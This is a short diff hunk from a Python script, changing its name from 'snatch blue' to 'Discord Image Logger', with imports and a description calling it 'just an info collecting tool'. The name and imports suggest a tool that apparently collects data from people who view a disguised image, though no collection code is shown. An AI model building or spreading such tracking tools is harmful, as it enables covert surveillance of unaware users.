@@ -7,7 +7,7 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "snatch blue"
+__app__ = "Discord Image Logger"
 __description__ = "just an info collecting tool"
 __version__ = "v1.0"
 __author__ = "fishyramen"
